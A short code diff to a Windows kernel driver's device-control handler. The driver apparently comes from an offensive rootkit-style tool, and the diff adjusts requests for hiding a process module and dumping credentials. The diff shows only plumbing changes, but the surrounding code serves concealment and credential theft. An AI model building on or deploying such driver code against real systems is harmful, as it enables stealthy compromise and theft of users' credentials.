@@ -738,6 +738,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 		auto data = static_cast<IoctlHiddenModuleInfo*>(Irp->AssociatedIrp.SystemBuffer);
+		hiddenModule.Hide = data->Hide;
 		hiddenModule.Pid = data->Pid;
 		SIZE_T moduleNameSize = wcslen(data->ModuleName) * sizeof(WCHAR);
 
@@ -1182,8 +1183,8 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 				Print(DRIVER_PREFIX "Need %llu bytes to dump credentials.\n", sizeToAlloc);
 			}
 		}
-		else if (size == sizeof(IoctlCredentials)) {
-			auto data = static_cast<IoctlCredentials*>(Irp->AssociatedIrp.SystemBuffer);
+		else if (size == sizeof(IoctlCredentialsInformation)) {
+			auto data = static_cast<IoctlCredentialsInformation*>(Irp->AssociatedIrp.SystemBuffer);
 			status = NidhoggMemoryHandler->GetCredentials(data);
 
 			if (NT_SUCCESS(status))
